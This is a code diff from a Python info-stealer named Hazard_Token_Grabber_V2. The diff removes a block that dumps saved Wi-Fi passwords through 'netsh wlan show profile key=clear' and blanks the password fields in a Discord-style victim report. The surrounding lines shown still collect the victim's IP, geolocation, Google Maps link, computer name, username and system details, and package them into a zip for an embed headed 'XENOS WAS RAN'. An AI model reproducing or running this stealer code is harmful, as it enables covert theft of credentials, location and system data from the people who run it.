@@ -270,20 +270,6 @@ class Hazard_Token_Grabber_V2:
             googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
         except:
             pass
-        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
-        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
-        for i in profiles:
-            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
-                'utf-8').split(
-                '\n')
-            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
-            try:
-                d = ("{:<30}|  {:<}".format(i, results[0]))
-                answer = d
-            except IndexError:
-                p = ("{:<30}|  {:<}".format(i, ""))
-                answer = p
-        getwifinetwork,getwifipassword = answer.split('|')
         sysinfo = f"Operating System: {plt.system()}\nComputer Name: {plt.node()}\nUsername: {getpass.getuser()}\nRelease Version: {plt.release()}\nProcessor Architecture: {plt.processor()} "
         temp = os.path.join(self.tempfolder)
         new = os.path.join(self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')
@@ -304,7 +290,7 @@ class Hazard_Token_Grabber_V2:
                         "url": "https://github.com/#####",
                         "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/Hazard.gif"
                     },
-                    "description": f"**XENOS WAS RAN**\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```\n[Google Maps Location]({googlemap})\n```fix\nnetwork:   {getwifinetwork}\npassword:{getwifipassword}```\nSYSTEM INFO```{sysinfo}```",
+                    "description": f"**XENOS WAS RAN**\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```\n[Google Maps Location]({googlemap})\n```fix\nnetwork:   None\npassword: NONE```\nSYSTEM INFO```{sysinfo}```",
                     "color": 16111121,
 
                     "thumbnail": {
